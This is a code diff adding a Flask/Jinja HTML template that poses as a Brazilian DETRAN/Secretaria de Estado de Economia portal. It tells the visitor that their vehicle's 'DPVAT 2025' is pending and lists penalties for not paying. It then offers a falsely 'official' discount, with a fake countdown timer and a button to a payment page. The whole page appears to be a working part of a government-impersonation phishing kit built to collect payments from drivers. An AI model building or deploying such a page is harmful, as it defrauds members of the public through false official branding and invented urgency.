@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal DPVAT - Detalhes do Veículo</title>
+
+    <!-- Preload fonts -->
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>
+
+    <!-- Styles -->
+    <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        .vehicle-info-box {
+            border: 1px solid #e2e8f0;
+            border-radius: 0.5rem;
+            padding: 0.75rem;
+            background-color: #f8fafc;
+        }
+        .info-label {
+            font-size: 0.75rem;
+            color: #4b5563;
+            font-weight: 600;
+            margin-bottom: 0.25rem;
+        }
+        .info-value {
+            font-size: 0.875rem;
+            color: #1f2937;
+            font-weight: 700;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .blink {
+            animation: blink 1s linear infinite;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'custom-blue': '#225BAC',
+                        'custom-yellow': '#F7CD04',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <!-- Header -->
+    <div class="bg-white py-4">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
+                <div>
+                    <p class="text-black text-[10px] leading-tight">
+                        SECRETARIA DE ESTADO DE ECONOMIA
+                    </p>
+                    <p id="state-text" class="text-black text-[10px] leading-tight font-bold">
+                        DETRAN - Distrito Federal
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Blue bar -->
+    <div class="bg-custom-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <button class="text-white text-2xl mr-4">
+                <div class="grid grid-cols-2 gap-0.5 drop-shadow-sm">
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-1.5 h-1.5 bg-white"></div>
+                </div>
+            </button>
+            <span class="text-white text-xl drop-shadow-sm">DETALHES DO VEÍCULO</span>
+        </div>
+    </div>
+
+    <!-- Warning Box -->
+    <div class="mt-6 flex justify-center">
+        <div class="bg-custom-yellow py-3 px-5 shadow-md rounded-lg max-w-2xl w-11/12">
+            <div class="flex items-start">
+                <i class="fas fa-exclamation-triangle text-2xl mr-3 text-black"></i>
+                <div>
+                    <p class="text-black font-bold text-base mb-1">DPVAT 2025 Pendente</p>
+                    <p class="text-black text-sm">
+                        Veículo <span class="font-bold">{{ veiculo.marca }} {{ veiculo.modelo }}</span>, 
+                        Placa <span class="font-bold">{{ veiculo.plate }}</span>
+                    </p>
+                    <div class="mt-2 text-sm">
+                        <p class="font-bold mb-1">Restrições por falta de pagamento:</p>
+                        <ul class="list-disc ml-4 text-xs">
+                            <li>Impedimento de renovação do licenciamento anual</li>
+                            <li>Multa em caso de fiscalização</li>
+                            <li>Restrição para transferência de propriedade</li>
+                            <li>Perda da cobertura do seguro em caso de acidentes</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Vehicle Details -->
+    <div class="container mx-auto px-4 py-6">
+        <div class="bg-white rounded-lg shadow-md p-6">
+            <div class="flex items-center justify-between mb-4 border-b pb-3">
+                <h2 class="text-xl font-bold text-gray-800">Documento do Veículo</h2>
+                {% if veiculo.logo %}
+                <img src="{{ veiculo.logo }}" alt="Logo {{ veiculo.marca }}" class="h-10">
+                {% endif %}
+            </div>
+
+            <div class="grid grid-cols-2 gap-3">
+                <div class="vehicle-info-box">
+                    <div class="info-label">Marca/Modelo</div>
+                    <div class="info-value">{{ veiculo.marca }} {{ veiculo.modelo }}</div>
+                </div>
+
+                <div class="vehicle-info-box">
+                    <div class="info-label">Ano Fabricação/Modelo</div>
+                    <div class="info-value">{{ veiculo.ano }}/{{ veiculo.year }}</div>
+                </div>
+
+                <div class="vehicle-info-box">
+                    <div class="info-label">Placa</div>
+                    <div class="info-value">{{ veiculo.plate }}</div>
+                </div>
+
+                <div class="vehicle-info-box">
+                    <div class="info-label">Chassi</div>
+                    <div class="info-value">{{ veiculo.chassis }}</div>
+                </div>
+
+                <div class="vehicle-info-box">
+                    <div class="info-label">Cor</div>
+                    <div class="info-value">{{ veiculo.color }}</div>
+                </div>
+
+                <div class="vehicle-info-box">
+                    <div class="info-label">Município/UF</div>
+                    <div class="info-value">{{ veiculo.municipio }}/{{ veiculo.uf }}</div>
+                </div>
+            </div>
+
+            <!-- Promotion Box -->
+            <div class="mt-6 bg-gray-100 rounded-lg shadow-lg overflow-hidden">
+                <div class="text-center p-6">
+                    <div class="flex flex-col items-center justify-center mb-4">
+                        <i class="fas fa-exclamation-triangle text-custom-yellow text-3xl blink mb-2"></i>
+                        <div class="bg-gray-200 text-gray-800 px-4 py-2 rounded-lg">
+                            <span id="countdown" class="font-bold"></span>
+                        </div>
+                    </div>
+                    <h3 class="text-xl font-bold text-gray-800 mb-3">DPVAT 2025 - PENDENTE</h3>
+                    <div class="flex justify-center items-center space-x-12 mb-6">
+                        <div class="text-center">
+                            <p class="text-sm text-gray-500 mb-1">Valor Regular</p>
+                            <p class="text-lg line-through text-gray-500">R$ 106,40</p>
+                        </div>
+                        <div class="text-center">
+                            <p class="text-sm font-medium text-gray-700 mb-1">Valor com Desconto</p>
+                            <p class="text-3xl font-bold text-custom-blue">R$ 82,60</p>
+                            <p class="text-xs text-gray-500 mt-1">Economia de R$ 23,80</p>
+                        </div>
+                    </div>
+                    <button onclick="window.location.href='{{ url_for('pagamento') }}'" class="mt-2 bg-green-600 text-white font-bold py-4 px-8 rounded-lg w-full hover:bg-green-700 transition-all transform hover:scale-[1.02] shadow-md flex items-center justify-center">
+                        <i class="fas fa-shield-alt mr-2"></i>
+                        <span>Emitir DPVAT com Desconto</span>
+                    </button>
+                    <p class="text-xs text-gray-500 mt-3">
+                        Desconto oficial do Ministério da Economia
+                    </p>
+                </div>
+            </div>
+
+            <div class="mt-6">
+                <a href="{{ url_for('index') }}" class="bg-custom-blue text-white font-bold py-2 px-4 rounded inline-block hover:bg-opacity-90">
+                    Voltar
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="bg-custom-blue text-white text-center py-3 mt-8">
+        <p class="text-sm">© Secretaria de Estado de Economia. Todos os direitos reservados.</p>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+    <script>
+        // Countdown timer functionality
+        function startCountdown() {
+            const minutes = 12;
+            let totalSeconds = minutes * 60;
+
+            function updateCountdown() {
+                const minutesLeft = Math.floor(totalSeconds / 60);
+                const secondsLeft = totalSeconds % 60;
+
+                document.getElementById('countdown').textContent = 
+                    `${minutesLeft.toString().padStart(2, '0')}:${secondsLeft.toString().padStart(2, '0')}`;
+
+                if (totalSeconds > 0) {
+                    totalSeconds--;
+                    setTimeout(updateCountdown, 1000);
+                }
+            }
+
+            updateCountdown();
+        }
+
+        // Start the countdown when the page loads
+        document.addEventListener('DOMContentLoaded', startCountdown);
+    </script>
+</body>
+</html>
